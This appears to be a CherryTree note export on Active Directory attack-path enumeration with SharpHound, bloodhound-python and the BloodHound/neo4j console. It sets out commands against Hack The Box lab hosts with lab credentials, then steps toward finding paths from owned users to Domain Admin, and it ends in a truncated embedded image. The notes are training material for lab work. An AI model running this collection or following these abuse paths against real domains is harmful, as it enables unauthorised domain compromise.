          <rich_text>

then


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

OR 

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>



where </rich_text>
          <rich_text family="monospace">ns</rich_text>
          <rich_text> is the name server aka dns

</rich_text>
          <rich_text scale="h3">To get more infor use:</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


where -c is for collection all


_________________________________________________________________________________________


</rich_text>
          <rich_text scale="h2">Running the console</rich_text>
          <rich_text>

To view all the json files generated by the commands above :

1.  Start bloodhound via : </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   
2. Start neo4j console: </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
3.  Use Default password as neo4j/neo4j

4. Upload all the Json Files or drop the zip file

5. First always check the pwned users and mark them owned before checking anything else

6.Click on the left side and click on Analysis
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


7. Select : </rich_text>
          <rich_text weight="heavy">Shortest Paths to High Value Targets</rich_text>
          <rich_text>  see that view
 
8. Check the machine u have access to and see the shortest path. or path from owned users and select Domain Admin

9. click on the joining arrows, select help and then abuse to see how it can be achieved
   
</rich_text>
          <codebox char_offset="94" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe -c all -d domain.local --domaincontroller 10.10.11.152</codebox>
          <codebox char_offset="127" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe</codebox>
          <codebox char_offset="596" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">upload SharpHound.ps1&#13;
Import-Module ./SharpHound.ps1&#13;
Invoke-Bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice</codebox>
          <codebox char_offset="719" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo apt install bloodhound.py</codebox>
          <codebox char_offset="729" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 10.10.11.152 -d support.htb -u 'ldap' -p 'password'</codebox>
          <codebox char_offset="737" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -c all  -u 'svc-alfresco' -p 's3rvice' -ns 10.10.11.152 -d htb.local -gc forest.htb.local</codebox>
          <codebox char_offset="803" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 10.10.11.152 -d support.htb -u 'ldap' -p 'password' -c all</codebox>
          <codebox char_offset="1042" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo bloodhound</codebox>
          <codebox char_offset="1072" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo neo4j console</codebox>
          <encoded_png char_offset="1302" justification="left" link="webs https://juggernaut-sec.com/wp-content/uploads/2022/05/8442901667a85bf701cabc4f8b9d7d3e.png">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